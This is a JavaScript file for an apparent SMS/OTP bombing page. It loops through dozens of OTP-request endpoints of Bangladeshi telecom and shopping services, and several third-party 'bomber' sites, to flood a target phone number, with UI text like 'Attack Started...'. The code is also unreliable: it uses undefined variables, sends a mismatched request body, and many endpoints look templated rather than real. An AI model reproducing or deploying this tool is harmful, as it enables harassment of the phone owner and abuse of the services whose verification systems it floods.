let isCooldown = false;

// পেজ লোড হওয়ার সময় চেক করবে কোনো আগের টাইমার বাকি আছে কি না
window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const target = document.getElementById('target').value;
    const countInput = document.getElementById('count');
    const count = parseInt(countInput.value);
    const display = document.getElementById('display');

    if (isCooldown) {
        display.innerText = "Wait for cooldown to end!";
        return;
    }

    if(!target || !count) { 
        display.innerText = "Enter number and amount!"; 
        return; 
    }

    if (count > 20) {
        display.innerText = "Error: Maximum limit is 20!";
        return;
    }

    display.innerText = "Attack Started...";
    
    // Apex এবং Bikroy এপিআই লিস্ট
    const apiList = [
        { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
        { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
        { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
        { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
        { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
        { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
        { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
        { url: `https://zeron-num-info2o.vercel.app/api/search?num=${phone}`},
        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`},
        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },,
        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
        { url: `https://lmnx9.appletolha.com/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://lmnx9.appletolha.com/call-boomber/trial.php?number=${phone}`, method: 'GET' },
        { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
    { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
    { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.sheba.xyz/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.ajkerdeal.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.shwapno.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.evaly.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.clicknshop.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.pickaboo.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.priyoshop.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.startech.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.daraz.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.foodpanda.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.hungrynaki.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.pathao.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.shohoz.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.bdtickets.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.bikroy.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.chaldal.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.sheba.xyz/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.ajkerdeal.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.shwapno.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.evaly.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.clicknshop.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.pickaboo.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.priyoshop.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.startech.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.ryanscomputers.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.techlandbd.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.skder.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.deligram.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.oasbd.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.bagdoom.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.rokomari.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.boibazar.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.eorange.shop/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.dhamakashopping.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.aleshamart.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.qcoom.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.boishakhi.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.need.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.daraz.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.foodpanda.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.hungrynaki.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.pathao.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.shohoz.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
    { url: `https://api.need.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } }
      ];
    for (let i = 1; i <= count; i++) {
        try { 
            let currentApi = apiList[(i - 1) % apiList.length];
            
            // এপিআই মেথড অনুযায়ী রিকোয়েস্ট পাঠানো
            if (currentApi.method === 'GET') {
                await fetch(currentApi.url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
            } else {
                await fetch(currentApi.url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(currentApi.body),
                    mode: 'cors'
                });
            }

            display.innerText = "Sent: " + i;
            // ৪ সেকেন্ড বিরতি আপনার কোড অনুযায়ী
            await new Promise(res => setTimeout(res, 4000));
        } catch (e) {
            console.log("Error skipped...");
        }
    }

    // কাজ শেষে ৬০ সেকেন্ডের কুলডাউন সেট করা
    const cooldownEndTime = Date.now() + 60000;
    localStorage.setItem('cooldownEndTime', cooldownEndTime);
    activateCooldown(60);
}

function activateCooldown(seconds) {
    isCooldown = true;
    let timeLeft = seconds;
    
    const timer = setInterval(() => {
        timeLeft--;
        document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
            isCooldown = false;
            localStorage.removeItem('cooldownEndTime'); 
            document.getElementById('display').innerText = "Ready for Next Attack!";
        }
    }, 1000);
}

// Matrix Background Animation (অপরিবর্তিত)
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const letters = "0123456789ABCDEF";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);
